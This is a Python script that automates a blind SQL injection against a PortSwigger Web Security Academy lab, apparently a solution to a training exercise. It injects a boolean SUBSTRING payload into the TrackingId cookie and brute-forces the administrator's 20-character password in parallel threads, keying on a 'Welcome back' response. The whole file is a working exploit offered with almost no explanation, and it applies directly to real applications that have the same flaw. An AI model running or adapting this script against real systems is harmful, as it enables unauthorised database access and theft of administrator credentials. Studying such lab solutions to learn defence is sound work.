import requests
import string
from pwn import log
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
sub = '0a1400240462e01080bb62bc00410077'
url = f'https://{sub}.web-security-academy.net/'
wordlist = string.ascii_lowercase + string.digits
password = ''
password_length = 20
max_workers = 10  # Adjust based on the server's capacity

# Function to test a single character at a given position
def test_char(position, char, session):
    payload = f"QNvd1UQ4vYdqdwCH' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--"
    try:
        response = session.get(url, cookies={"TrackingId": payload}, timeout=5)
        if "Welcome back" in response.text:
            return char
    except requests.RequestException as e:
        log.info(f"Request failed for character '{char}' at position {position}: {e}")
    return None

# Create a single session to reuse connections
session = requests.Session()

for position in range(1, password_length + 1):
    found = False
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all character tests for the current position
        futures = {executor.submit(test_char, position, char, session): char for char in wordlist}
        for future in as_completed(futures):
            result = future.result()
            if result:
                log.success(f"Found character '{result}' at position {position} of the password")
                password += result
                log.info(f"Password so far: {password}")
                found = True
                # Cancel other futures since we've found the correct character
                executor.shutdown(wait=False, cancel_futures=True)
                break
    if not found:
        print(f"Failed to find character at position {position}")
        break

print(f"Final password: {password}")
